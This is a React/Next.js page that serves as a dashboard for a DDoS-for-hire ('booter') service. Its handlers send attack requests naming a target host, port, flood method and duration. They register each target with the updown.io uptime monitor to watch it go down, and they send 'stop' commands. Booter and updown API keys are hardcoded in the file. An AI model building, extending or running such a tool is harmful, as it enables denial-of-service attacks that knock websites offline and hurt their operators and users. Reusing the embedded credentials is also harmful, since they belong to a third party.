import Head from 'next/head'
import Image from 'next/image'
import { Inter } from '@next/font/google'
import styles from '@/styles/Home.module.css'


import { useEffect, useState } from 'react';
import { getUpDownAccountInfo } from 'booterAndUpDownApi/upDown';
import Form from 'components/Form';
import Item from 'components/Item';

const inter = Inter({ subsets: ['latin'] })

export default function Home() {

    const [booterApikey, setBooterApikey] = useState('13f1cffe6a828d73bd7f7bf6-28097a6a');

    const [upDownApikey, setUpDownApikey] = useState('SV67GruC8uVxPJPYtBhy');
    const [upDownAccountName, setUpDownAccountName] = useState(null);


    // all items list 
    //--------------------------------------
    const [items, setItems] = useState([
        // {
        //   id: 1,
        //   url: 'https://www.google.com',
        //   port: 80,
        //   status: 'not-running', // running, not-running, error
        //   isStarred: false,
        //   expiresIn: 60,
        //   method: 'HTTPSV2',
        //   interval: 30,
        // }
    ]);


    // add
    //--------------------------------------
    const handleAdd = async (formData) => {
        console.log(formData);
        try {
            // send attack request
            const booterInfo = await fetch('api/sendBooterRequest', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: booterApikey,
                    host: formData.url,
                    port: formData.port,
                    method: formData.method,
                    time: formData.expiresIn,
                }),
            });
            const booterInfoJson = await booterInfo.json();
            console.log(booterInfoJson);


            // add to updown
            const data = await fetch('api/addUrlToUpDown', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: upDownApikey,
                    url: formData.url,
                    period: formData.interval,
                }),
            });
            const json = await data.json();
            formData.updownToken = json.token;
            console.log(json)
            console.log(formData)
            setItems([...items, formData]);
        } catch (error) {
            console.log(error);
        }
    }

    // update 
    //--------------------------------------
    const handleUpdate = (id, formData) => {
        setItems(items.map(item => item.id === id ? formData : item));
    }


    // delete 
    //--------------------------------------
    const handleDelete = async(id) => {
        try {
            // delete from booter
            const booterInfo = await fetch('api/sendBooterRequest', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: booterApikey,
                    host: items.find(item => item.id === id).url,
                    port: items.find(item => item.id === id).port, 
                    time: items.find(item => item.id === id).expiresIn,
                    method: 'stop',
                }),
            });
            const booterInfoJson = await booterInfo.json();
            console.log(booterInfoJson);

            // delete from updown
            const data = await fetch('api/deleteUrlFromUpDown', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: upDownApikey,
                    token: items.find(item => item.id === id).updownToken,
                }),
            });
            const json = await data.json();


            setItems(items.filter(item => item.id !== id));
            console.log(items);
        } catch (error) {
            console.log(error);
        }
    }


    // on api key added or changed
    useEffect(() => {
        // if api key is not null
        if (upDownApikey) {
            // get account info
            getUpDownAccountInfo(upDownApikey).then(data => {
                setUpDownAccountName(data[0].name);
            });
        }
    }, [upDownApikey]);

    useEffect(() => {
        // if api key is not null
        if (booterApikey) {
            // get account info
            console.log(booterApikey);
        }
    }, [booterApikey]);


    // get items from items.json
    useEffect(() => {
        fetch('api/itemsGetter', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        }).then(res => res.json()).then(data => {
            setItems(data);
        });
    }, []);

    // set items to items.json
    useEffect(() => {
        if (items.length === 0) return;
        fetch('api/itemsSetter', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(items),
        }).then(res => res.json()).then(data => {})
    }, [items]);
  
  

    return (
        <>
            <Head>
                <title>Create Next App</title>
                <meta name="description" content="Generated by create next app" />
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                <link rel="icon" href="/favicon.ico" />
            </Head>
            <main>
                <label htmlFor="upDownApiKey">updown api key</label>
                <input id='upDownApiKey' type="text" placeholder='updown api key' onChange={(e)=> setUpDownApikey(e.target.value)} />
                {
                    upDownAccountName === null?
                    <strong style={{color: 'red'}}> Account Not Connected </strong>
                    : <strong style={{color: 'green'}}>{upDownAccountName}</strong>
                }
                
                <br />
                <label htmlFor="booterApiKey">booter api key</label>
                <input id='booterApiKey' type="text" placeholder='booter api key' onChange={(e)=> setBooterApikey(e.target.value)} />

                <h1>add item</h1>
                <Form onSubmit={handleAdd} />

                <h1>all items</h1>
                <ul>
                    {items && items.map(item => (
                        <Item 
                            key={item.id} 
                            upDownApikey={upDownApikey} 
                            booterApikey={booterApikey}
                            itemData={item} 
                            handleDelete={handleDelete} 
                            handleUpdate={handleUpdate} />
                    ))}
                </ul>
            </main>
        </>
    )
}
